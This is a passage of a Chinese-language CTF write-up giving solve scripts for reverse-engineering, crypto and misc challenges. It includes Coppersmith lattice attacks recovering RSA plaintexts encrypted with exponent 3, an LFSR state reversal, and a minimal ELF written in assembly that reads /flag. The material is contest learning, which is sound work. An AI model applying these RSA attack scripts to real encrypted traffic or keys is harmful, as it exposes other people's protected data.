class="hljs-number">0x5b</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x6d</span>,<br><span class="hljs-number">0x77</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x76</span>,<br><span class="hljs-number">0x66</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x65</span>,<br><span class="hljs-number">0x6d</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x67</span>,<br><span class="hljs-number">0x6a</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x27</span>,<br><span class="hljs-number">0x7e</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x77</span>,<br><span class="hljs-number">0x7e</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6d</span>,<br><span class="hljs-number">0x5f</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x6c</span>,<br><span class="hljs-number">0x3f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x66</span>,<br><span class="hljs-number">0x5b</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x3f</span>,<br><span class="hljs-number">0x5f</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x3e</span>]<br><span class="hljs-comment">#  &quot;&gt;kp:wm06fqzsx9o?&lt;4_-+^d#3&#123;!&#x27;e8]`~*ya|gbj)$i5n1/[c&amp;urh\\&#125;2;7%v(@lt&quot;</span><br><span class="hljs-built_in">map</span>=[<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x36</span>,<br><span class="hljs-number">0x66</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x3f</span>,<br><span class="hljs-number">0x3c</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x23</span>,<br><span class="hljs-number">0x33</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x60</span>,<br><span class="hljs-number">0x7e</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6a</span>,<br><span class="hljs-number">0x29</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x5b</span>,<br><span class="hljs-number">0x63</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x32</span>,<br><span class="hljs-number">0x3b</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x74</span>]<br><br><span class="hljs-comment"># print(len(s),len(map))</span><br><br><span class="hljs-comment"># reverse the  5  step</span><br>binflag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    bintemp=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">map</span>.index(s[i]))[<span class="hljs-number">2</span>:]<br>    binflag=binflag+(<span class="hljs-number">6</span>-<span class="hljs-built_in">len</span>(bintemp))*<span class="hljs-string">&#x27;0&#x27;</span>+bintemp<br><br><span class="hljs-comment"># print(len(binflag))</span><br><span class="hljs-comment"># print(binflag)</span><br><br><br><span class="hljs-comment"># reverse the 4  step</span><br>flag3=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(binflag)/<span class="hljs-number">8</span>)):<br>    flag3.append(<span class="hljs-built_in">int</span>(binflag[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))<br>    <br><span class="hljs-comment"># print(flag3)</span><br><br><span class="hljs-comment"># reverse the 3  step</span><br>flag2=[]<br>x=BitVec(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">67</span>):<br>    s=Solver() <br><br>    s.add(flag3[i] == (i &amp; <span class="hljs-number">0xF7</span> | ~i &amp; <span class="hljs-number">8</span>) ^ (x &amp; <span class="hljs-number">0xF7</span> | ~x&amp; <span class="hljs-number">8</span>))<br>    s.check()<br>    flag2.append(s.model().<span class="hljs-built_in">eval</span>(x))<br>    <br><span class="hljs-comment"># print(flag2)</span><br><span class="hljs-comment"># print(len(flag2))</span><br><br><br><br><span class="hljs-comment"># reverse the 2  step</span><br>flag1=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag2)):<br>    s=Solver() <br>    s.add(x+<span class="hljs-number">0x6c</span>==flag2[i])<br>    s.check()<br>    flag1.append(s.model().<span class="hljs-built_in">eval</span>(x))<br>    <br><span class="hljs-comment"># print(flag1)</span><br><span class="hljs-comment"># print(len(flag1))</span><br><br><span class="hljs-comment"># reverse the 1  step</span><br>flag0=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag1)):<br>    s=Solver() <br>    s.add(x*<span class="hljs-number">0xD9</span>==flag1[i])<br>    s.check()<br>    flag0.append(s.model().<span class="hljs-built_in">eval</span>(x).as_long())<br>    <br><span class="hljs-comment"># print(flag0)</span><br><span class="hljs-comment"># print(len(flag0))</span><br><br><span class="hljs-comment">#get flag!</span><br>flag=<span class="hljs-string">&#x27;0ops&#123;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag0)):<br>    flag+=<span class="hljs-built_in">chr</span>((flag0[i]))<br>    <span class="hljs-comment"># print(chr((flag0[i])),end=&#x27;&#x27;)</span><br><br>flag+=<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></div></td></tr></table></figure>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="baby-rsa"><a class="markdownIt-Anchor" href="#baby-rsa"></a> Baby RSA</h3>
<p>这题和下面的那题都是coppersmith攻击</p>
<p><img src="/posts/764dc2d/image-20230228081334162.png" srcset="/img/loading.gif" lazyload alt="image-20230228081334162"></p>
<p>在这两题里面则都是低位泄露，区别是第一题低位全是&quot;\00&quot;,第二题则是&quot;\01&quot;</p>
<p>原理参考：</p>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">密码学学习笔记 之 Coppersmith’s Method | Van1sh的小屋 (jayxv.github.io)</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://github.com/cscosu/ctf-sjtuctf_writeups/tree/master/2021/utctf/A_Bit_Weird">ctf-sjtuctf_writeups/2021/utctf/A_Bit_Weird at master · cscosu/ctf-sjtuctf_writeups (github.com)</a></p>
</li>
</ul>
<p>代码参考</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/mimoo/RSA-and-LLL-attacks">mimoo/RSA-and-LLL-attacks: attacking RSA via lattice reductions (LLL) (github.com)</a></li>
</ul>
<p>方法主要就是上面的，这题唯一的不同就在于flag位数不知道，所以我们可以从0开始猜测，知道猜到为止</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Coppersmith implementation omitted</span><br><span class="hljs-comment"># ...</span><br><span class="hljs-comment">#https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span><br><br><br><span class="hljs-comment"># Public key</span><br>N = <span class="hljs-number">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span><br><br>e = <span class="hljs-number">3</span><br><br><span class="hljs-comment"># Ciphertext</span><br>C = <span class="hljs-number">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span><br>mbits=<span class="hljs-number">255</span>*<span class="hljs-number">8</span><br>fbits=<span class="hljs-number">0</span><br><span class="hljs-comment"># Problem to equation.</span><br><span class="hljs-comment"># The `x` here was called `a` previously, which we are now solving for.</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    t=mbits-fbits<br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    pol =((<span class="hljs-number">2</span>**t)*x)^<span class="hljs-number">3</span> - C<br>    <span class="hljs-comment">#keep the polynomial be monic</span><br>    pol=pol*<span class="hljs-number">1</span>/(<span class="hljs-number">2</span>**(<span class="hljs-number">3</span>*t))<br>    dd = pol.degree()<br>        <br>    beta = <span class="hljs-number">1</span>                                <span class="hljs-comment"># b = N</span><br>    epsilon = beta / <span class="hljs-number">7</span>                      <span class="hljs-comment"># &lt;= beta / 7</span><br>    mm = ceil(beta**<span class="hljs-number">2</span> / (dd * epsilon))     <span class="hljs-comment"># optimized value</span><br>    tt = floor(dd * mm * ((<span class="hljs-number">1</span>/beta) - <span class="hljs-number">1</span>))    <span class="hljs-comment"># optimized value</span><br>    XX = ceil(N**((beta**<span class="hljs-number">2</span>/dd) - epsilon))  <span class="hljs-comment"># optimized value</span><br><br>    <span class="hljs-comment"># Coppersmith</span><br>    roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)<br>    <span class="hljs-keyword">if</span> roots :<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solutions&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We found:&quot;</span>, <span class="hljs-built_in">str</span>(roots))<br>        <span class="hljs-keyword">break</span><br>        <br>    fbits=fbits+<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure>
<h3 id="child-rsa"><a class="markdownIt-Anchor" href="#child-rsa"></a> Child RSA</h3>
<p>这题和上一题的不同在于填充的是&quot;\01&quot;的话，就会有一个初始值obs，然后随着猜测的flag位数增多，每多一个flag字节，obs也要随之右移八位（本来充当初始值的&quot;\01&quot;字节变成了flag）</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Coppersmith implementation omitted</span><br><span class="hljs-comment"># ...</span><br><span class="hljs-comment">#https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span><br><br><br><span class="hljs-comment"># Public key</span><br>N = <span class="hljs-number">17022643406514350347573614465221696412722093893069884767243788880650197186586896695677232954756001085570908846778062553748252730496162774516963609020852021240663517062164143433972096285671583857300879566762429174925637808711899529732967964744088548497546563683172958195418996012865897850179068749931908849579004796030024201648134080256899877361133867143808268771425201158477438673553801559428342889346934705891370908283804031253368466095743470387105335979770140651537303634622746448342605800452083233872484864431450513349565059478371458778685883614230275550760174388677496289114774270577941915682644246153516217470289</span><br><br>e = <span class="hljs-number">3</span><br><br><span class="hljs-comment"># When the plaintext is all &quot;\01&quot;, the value of the plaintext</span><br>obs = <span class="hljs-number">495052176337484793209480341431831371943077553151278860786310438534385035828245877653143403975534826343270802097455545641760409913457275139324267040233582768392017116533409866601565529264547366832047451568383387994436155310089150676498745317684990356473370800429477712054037620887577601234797064937560208111548932803150556716003139932392226861134438971129386060938691875908869886530460482753527245601473301420434185105981339726678896310543836487506184093339970699007768469434908397820544685994591472479621301203747804809054013438547074121296193706592975449380263513104062953502532452184512134623063049228110594305</span><br><br><span class="hljs-comment"># Ciphertext</span><br>C = <span class="hljs-number">10088954389542658663077044386740489535866172426326748107784765612159430710527597086310603801683753417139731264363316794723662372601299203077752739446972556295683485131157486247417294521292140588628362607308559425442891679240914949533979646639480977018048274634683178050115685619885440372360909915411211084288823319768919032869663471687459141400692710646506779965970673444529390934838362742549584680323138349280482498688162486557646299516751719641918621363346158293504750655242051515635578604352560835264580160613875390322478127765076929382739079241813070414004156259128506302734623223854631500490081853943357206804087</span><br><br>mbits=<span class="hljs-number">255</span>*<span class="hljs-number">8</span><br>fbits=<span class="hljs-number">0</span><br>remain=obs<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    t=mbits-fbits<br>    <span class="hljs-comment"># Problem to equation.</span><br>    <span class="hljs-comment"># The `x` here was called `a` previously, which we are now solving for.</span><br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    pol = (remain + (<span class="hljs-number">2</span>**t)*x)^<span class="hljs-number">3</span> - C<br>    pol=pol*<span class="hljs-number">1</span>/(<span class="hljs-number">2</span>**(<span class="hljs-number">3</span>*t))<br>    dd = pol.degree()<br>        <br>    beta = <span class="hljs-number">1</span>                                <span class="hljs-comment"># b = N</span><br>    epsilon = beta / <span class="hljs-number">7</span>                      <span class="hljs-comment"># &lt;= beta / 7</span><br>    mm = ceil(beta**<span class="hljs-number">2</span> / (dd * epsilon))     <span class="hljs-comment"># optimized value</span><br>    tt = floor(dd * mm * ((<span class="hljs-number">1</span>/beta) - <span class="hljs-number">1</span>))    <span class="hljs-comment"># optimized value</span><br>    XX = ceil(N**((beta**<span class="hljs-number">2</span>/dd) - epsilon))  <span class="hljs-comment"># optimized value</span><br><br>    <span class="hljs-comment"># Coppersmith</span><br>    roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)<br>    <span class="hljs-keyword">if</span> roots :<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solutions&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We found:&quot;</span>, <span class="hljs-built_in">str</span>(roots))<br>        <span class="hljs-keyword">break</span><br>        <br>    fbits=fbits+<span class="hljs-number">8</span><br>    remain=remain&gt;&gt;<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure>
<h3 id="rsfl"><a class="markdownIt-Anchor" href="#rsfl"></a> RSFL</h3>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br>mask = <span class="hljs-number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span><br>b = <span class="hljs-string">&#x27;&#x27;</span><br>N = <span class="hljs-number">208</span><br><br>tmp=<span class="hljs-number">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span><br>keys=<span class="hljs-built_in">bin</span>(tmp)[<span class="hljs-number">2</span>:]<br><span class="hljs-comment"># keys=&#x27;000&#x27;+keys</span><br><span class="hljs-comment"># print(keys)</span><br><br>idx = <span class="hljs-number">0</span><br>ans = <span class="hljs-string">&quot;&quot;</span><br>keys = keys[<span class="hljs-number">207</span>] + keys[:<span class="hljs-number">207</span>]<br><span class="hljs-comment"># print(keys)</span><br><span class="hljs-comment"># print(keys[:208])</span><br><span class="hljs-keyword">while</span> idx &lt; <span class="hljs-number">208</span>:<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">208</span>):<br>        <span class="hljs-keyword">if</span> mask &gt;&gt; i &amp; <span class="hljs-number">1</span>:<br>            tmp ^= <span class="hljs-built_in">int</span>(keys[<span class="hljs-number">207</span> - i])<br>    ans = <span class="hljs-built_in">str</span>(tmp) + ans<br>    idx += <span class="hljs-number">1</span><br>    keys = keys[<span class="hljs-number">207</span>] + <span class="hljs-built_in">str</span>(tmp) + keys[<span class="hljs-number">1</span>:<span class="hljs-number">207</span>]<br>num = <span class="hljs-built_in">int</span>(ans, <span class="hljs-number">2</span>)<br><span class="hljs-comment"># print (hex(num))</span><br><span class="hljs-built_in">print</span>(libnum.n2s(num))<br></code></pre></div></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="tiny-elf-and-tennsy-elf"><a class="markdownIt-Anchor" href="#tiny-elf-and-tennsy-elf"></a> Tiny elf  and Tennsy ELF</h3>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux (muppetlabs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://tinylab-1.gitbook.io/cbook/02-chapter8#da-zao-shi-shang-zui-xiao-ke-zhi-hang-elf-wen-jian-45-zi-jie-ke-da-yin-zi-fu-chuan">打造史上最小可执行ELF文件(45字节) - C 语言编程透视 (gitbook.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://asmtutor.com/#lesson25">NASM 汇编语言教程 - asmtutor.com</a></p>
<p>首先得用汇编来写系统调用，这个毫无疑问</p>
<p>下面是最基本的用汇编实现的功能，用自定义的ld脚本只链接text、bss、data段后，再用sstrip大概四百多字节。</p>
<p>还有很多可以优化的地方</p>
<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"> <br><span class="hljs-comment">; SECTION .data</span><br>filename <span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-number">0h</span>    <span class="hljs-comment">; the filename to create</span><br> <br><span class="hljs-meta">SECTION</span> .bss<br>fileContents <span class="hljs-built_in">resb</span> <span class="hljs-number">20h</span>,         <br> <br><span class="hljs-meta">SECTION</span> .text<br><span class="hljs-meta">global</span>  _start<br><span class="hljs-symbol"> </span><br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0</span>             <br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebx</span>, filename<br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">5</span><br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span><br> <br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">20h</span>             <br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, fileContents   <br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">eax</span>            <br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">3</span>              <br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>                 <br> <br>    <span class="hljs-keyword">xor</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br>    <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">al</span>,<span class="hljs-number">4</span>                      <br>    <span class="hljs-keyword">xor</span>   <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">inc</span>   <span class="hljs-built_in">ebx</span>                      <br>    <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">ecx</span>, fileContents             <br>    <span class="hljs-keyword">xor</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span><br>    <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">dl</span>,<span class="hljs-number">20h</span>                    <br>    <span class="hljs-keyword">int</span>   <span class="hljs-number">0x80</span><br>    <br>    <span class="hljs-comment">;1 sys_exit</span><br>    <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">bl</span>, <span class="hljs-number">42</span>                  <br>    <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br>    <span class="hljs-keyword">inc</span>     <span class="hljs-built_in">eax</span>                    <br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">0x80</span><br></code></pre></div></td></tr></table></figure>
<p>接下来还有三个优化方向：</p>
<ul>
<li>去除data段和bss段
<ul>
<li>将字符串放入elf头</li>
</ul>
</li>
<li>elf文件结构的优化
<ul>
<li>elf头的极致简化，最少可以减到45字节</li>
</ul>
</li>
<li>汇编语言本身的优化
<ul>
<li>将能改成al,dl的寄存器都改成al,dl</li>
<li>可以重复利用对统一寄存器赋值的语句</li>
<li>在目标寄存器的值没有变化的情况下，不需要重复赋值</li>
</ul>
</li>
</ul>
<p>主要过程就是顺着<a target="_blank" rel="noopener" href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux (muppetlabs.com)</a>这个经典文章的思路下来。</p>
<p>具体优化细节以后细写，感觉可以加深对elf文件结构的理解。</p>
<p>最终可以编译出78字节文件的汇编文件如下。</p>
<figure class="highlight crystal"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crystal">nasm -f bin -o a.<span class="hljs-keyword">out</span> tiny.<span class="hljs-keyword">asm</span><br></code></pre></div></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  BITS <span class="hljs-number">32</span><br>  <br>                org     <span class="hljs-number">0x00010000</span><br>  <br>                db      <span class="hljs-number">0x7F</span>, <span class="hljs-string">&quot;ELF&quot;</span>             ; e_ident<br>                dd      <span class="hljs-number">1</span>                                       ; p_type<br>                dd      <span class="hljs-number">0</span>                                       ; p_offset<br>                dd      $$                                      ; p_vaddr <br>                dw      <span class="hljs-number">2</span>                       ;dw e_type        ; p_paddr<br>                dw      <span class="hljs-number">3</span>                       ;dw e_machine<br>                dd      _start                  ;dd e_version     ; p_filesz<br>                dd      _start                  ;dd e_entry 